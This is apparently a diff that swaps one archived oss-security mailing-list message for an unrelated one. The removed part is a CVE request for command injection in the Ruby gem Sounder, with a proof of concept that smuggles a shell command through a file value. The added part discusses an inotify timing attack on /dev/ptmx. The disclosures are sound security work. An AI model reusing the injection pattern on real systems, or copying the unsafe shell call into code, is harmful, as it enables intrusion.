@@ -1,50 +1,29 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/28/9
-Message-id: <ec7a0f8e-ed17-4cdb-8806-f2607f0e54da@me.com>
-Date: Wed, 28 Aug 2013 20:19:39 +0000 (GMT)
-From: "Larry W. Cashdollar" <larry0@...com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/01/08/5
+Message-ID: <20130108065321.GA5525@cachalot>
+Date: Tue, 8 Jan 2013 10:53:21 +0400
+From: Vasily Kulikov <segoon@...nwall.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: Command Injection in Ruby Gem Sounder 1.0.1
+Subject: Re: /dev/ptmx timing
 Content-Type: text/plain; charset=utf-8
 
-Yes sir, Please assign a CVE.
+On Tue, Jan 08, 2013 at 06:43 +0400, Dmitry V. Levin wrote:
+> On Mon, Jan 07, 2013 at 08:11:11PM -0500, adam swanda wrote:
+> > Don't you need to be running as root for this to be possible?
+> 
+> You certainly haven't followed the link listed below, have you?
+> 
+> The elegance of this timing attack is that all you need is
+> inotify_add_watch(fd, "/dev/ptmx", IN_MODIFY)
+> which is usually available to everybody who has read access to /dev/ptmx.
 
-﻿Thank you!
-Larry C$
+FWIW, more harmless ways to (ab)use inotify were posted to ossec 2
+years ago:
 
-On Aug 28, 2013, at 12:36 PM, Henri Salo <henri@...v.fi> wrote:
+http://www.openwall.com/lists/kernel-hardening/2011/07/22/1
 
-> On Wed, Aug 28, 2013 at 03:06:14AM +0000, Larry W. Cashdollar wrote:
->> Title: Command Injection in Ruby Gem Sounder 1.0.1
->> Date: 8/10/2013
->> Author: Larry W. Cashdollar @_larry0
->> Download: https://rubygems.org/gems/sounder
->>  
->> CVE: TBD
->> Description:
->> Sounder is a ruby gem API for Mac OSX's afplay command.
->> It passes user supplied data directly to command line.
->> From lib/sounder/sound.rb:
->> def play
->> system %{/usr/bin/afplay "#{@...e}" &}
->> end
->> PoC:
->> irb(main):098:0> @file = "\"id;/usr/bin/id>/tmp/p;\""
->> => "\"id;/usr/bin/id>/tmp/p;\""
->> irb(main):099:0> system %{/bin/echo "#{@...e}" }
->> id
->> sh: 1: : Permission denied
->> => false
->> irb(main):100:0>
->> larry@...erfl0w:/tmp$ cat /tmp/p
->> uid=1000(larry) gid=600(staff) groups=600(user)
->> Author Notified: 8/9/2013
->> Advisory: http://vapid.dhs.org/advisories/sounder-ruby-gem-cmd-inj.html
->>  
->
-> This was the CVE request (just to be clear).
->
-> ---
-> Henri Salo
+Thanks,
 
-Content of type "text/html" skipped
+-- 
+Vasily Kulikov
+http://www.openwall.com - bringing security into open computing environments
